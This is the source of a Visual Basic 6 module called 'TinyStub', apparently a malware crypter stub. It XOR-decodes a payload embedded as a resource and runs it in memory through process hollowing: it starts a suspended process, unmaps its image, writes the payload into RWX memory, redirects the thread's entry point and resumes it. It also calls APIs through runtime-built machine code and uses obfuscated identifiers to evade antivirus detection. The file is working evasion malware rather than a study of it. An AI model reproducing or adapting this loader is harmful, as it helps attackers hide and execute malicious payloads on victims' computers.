Attribute VB_Name = "TinyStub"
'++++++++++++ Api's ++++++++++++
Private Declare Sub CopyBytes Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal Length As Long)
'++++++++++++++++++++++++



Private Type SUI
    cb As Long
End Type


Private Type P_I
    hP As Long
    hT As Long
End Type


Private Type F_S_A
    CW As Long
    SW As Long
    TW As Long
    EO As Long
    ES As Long
    DO As Long
    DS As Long
    RA(1 To 80) As Byte
    CNS As Long
End Type


Private Type CX
    CF As Long
    D0 As Long
    D1 As Long
    D2 As Long
    D3 As Long
    D6 As Long
    D7 As Long
    FS As F_S_A
    SGs As Long
    SFs As Long
    SEs As Long
    SDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SCs As Long
    EFlags As Long
    Esp As Long
    SSs As Long
End Type


Private Type I_D_H
    e_ma As Integer
    e_cb As Integer
    e_cp As Integer
    e_cr As Integer
    e_cpa As Integer
    e_min As Integer
    e_max As Integer
    e_ss As Integer
    e_sp As Integer
    e_cs As Integer
    e_ip As Integer
    e_csa As Integer
    e_lf As Integer
    e_ov As Integer
    e_re(0 To 3) As Integer
    e_oe As Integer
    e_oe2 As Integer
    e_re2(0 To 9) As Integer
    e_lfn As Long
End Type


Private Type I_F_H
    MCH As Integer
    NOS As Integer
    TDS As Long
    PTST As Long
    NOS2 As Long
    SOOH As Integer
    chst As Integer
End Type


Private Type I_D_D
    VA As Long
    Sz As Long
End Type


Private Type I_O_H
    M As Integer
    MLV As Byte
    MLV2 As Byte
    SOC As Long
    SOFD As Long
    SOUD As Long
    AOEP As Long
    BOC As Long
    BOD As Long
    IB As Long
    SA As Long
    FA As Long
    MOSV As Integer
    MOSV2 As Integer
    MIV As Integer
    MIV2 As Integer
    MSV As Integer
    MSV2 As Integer
    W32VV As Long
    SOI As Long
    SOH As Long
    CS As Long
    SS As Integer
    D As Integer
    SOSS As Long
    SOSC As Long
    SOHR As Long
    SOHC As Long
    LF As Long
    NORAZ As Long
    DD(0 To 15) As I_D_D
End Type


Private Type I_N_H
    s As Long
    FH As I_F_H
    OH As I_O_H
End Type


Private Type I_S_H
    SN As String * 8
    VS As Long
    VA As Long
    SORD As Long
    PTRD As Long
    PTR As Long
    PTL As Long
    NOR As Integer
    NOL As Integer
    chst As Long
End Type


Sub pooper()
    Dim bFile() As Byte
    bFile = LoadResData("40", "4")
    For i = 0 To UBound(bFile)
    bFile(i) = bFile(i) Xor (i Mod 255) 'dexor it byte by byte
    Next i
    Call InjPE(App.Path & "\" & App.EXEName & ".exe", bFile)
    End
End Sub


Sub InjPE(szProcessName As String, lpBuffer() As Byte)
    Dim ppDPfXbOA As I_D_H
    Dim pcOUI9I6D As I_N_H
    Dim yEgvFUKuE As I_S_H
    Dim og30xmELR As SUI
    Dim SvezHRTFp As P_I
    Dim Ltp3EurWk As CX
    og30xmELR.cb = Len(og30xmELR)
    Ltp3EurWk.CF = &H10007
    Call CallAPI("kernel32", "RtlMoveMemory", VarPtr(ppDPfXbOA), VarPtr(lpBuffer(0)), Len(ppDPfXbOA))
    Call CallAPI("kernel32", "RtlMoveMemory", VarPtr(pcOUI9I6D), VarPtr(lpBuffer(ppDPfXbOA.e_lfn)), Len(pcOUI9I6D))
    Call CallAPI("kernel32", "CreateProcessW", 0, StrPtr(szProcessName), 0, 0, 0, &H4, 0, 0, VarPtr(og30xmELR), VarPtr(SvezHRTFp))
    Call CallAPI("ntdll", "NtUnmapViewOfSection", SvezHRTFp.hP, pcOUI9I6D.OH.IB)
    Call CallAPI("kernel32", "VirtualAllocEx", SvezHRTFp.hP, pcOUI9I6D.OH.IB, pcOUI9I6D.OH.SOI, &H1000 Or &H2000, &H40)
    Call CallAPI("ntdll", "NtWriteVirtualMemory", SvezHRTFp.hP, pcOUI9I6D.OH.IB, VarPtr(lpBuffer(0)), pcOUI9I6D.OH.SOH, 0)
    For i = 0 To pcOUI9I6D.FH.NOS - 1
    CopyBytes yEgvFUKuE, lpBuffer(ppDPfXbOA.e_lfn + Len(pcOUI9I6D) + Len(yEgvFUKuE) * i), Len(yEgvFUKuE)
    Call CallAPI("ntdll", "NtWriteVirtualMemory", SvezHRTFp.hP, pcOUI9I6D.OH.IB + yEgvFUKuE.VA, VarPtr(lpBuffer(yEgvFUKuE.PTRD)), yEgvFUKuE.SORD, 0)
    Next
    Call CallAPI("ntdll", "NtGetContextThread", SvezHRTFp.hT, VarPtr(Ltp3EurWk))
    Call CallAPI("ntdll", "NtWriteVirtualMemory", SvezHRTFp.hP, Ltp3EurWk.Ebx + 8, VarPtr(pcOUI9I6D.OH.IB), 4, 0)
    Ltp3EurWk.Eax = pcOUI9I6D.OH.IB + pcOUI9I6D.OH.AOEP
    Call CallAPI("ntdll", "NtSetContextThread", SvezHRTFp.hT, VarPtr(Ltp3EurWk))
    Call CallAPI("ntdll", "NtResumeThread", SvezHRTFp.hT, 0)

End Sub

Sub Main()
Call pooper
End Sub

Private Function CallAPI(ByVal strLib As String, ByVal strMod As String, ParamArray Params()) As Long
    Dim P2lWQuc4z                As Long
    Dim WDhLsE7M4(&HEC00& - 1)  As Byte
    P2lWQuc4z = VarPtr(WDhLsE7M4(0))
    CopyBytes ByVal P2lWQuc4z, &H59595958, &H4
    P2lWQuc4z = P2lWQuc4z + 4
    CopyBytes ByVal P2lWQuc4z, &H5059, &H2
    P2lWQuc4z = P2lWQuc4z + 2
    For i = UBound(Params) To 0 Step -1
    CopyBytes ByVal P2lWQuc4z, &H68, &H1
    P2lWQuc4z = P2lWQuc4z + 1
    CopyBytes ByVal P2lWQuc4z, CLng(Params(i)), &H4
    P2lWQuc4z = P2lWQuc4z + 4
    Next
    CopyBytes ByVal P2lWQuc4z, &HE8, &H1
    P2lWQuc4z = P2lWQuc4z + 1
    CopyBytes ByVal P2lWQuc4z, GetProcAddress(LoadLibrary(strLib), strMod) - P2lWQuc4z - 4, &H4
    P2lWQuc4z = P2lWQuc4z + 4
    CopyBytes ByVal P2lWQuc4z, &HC3, &H1
    P2lWQuc4z = P2lWQuc4z + 1
    CallAPI = CallWindowProcA(VarPtr(WDhLsE7M4(0)), 0, 0, 0, 0)
End Function
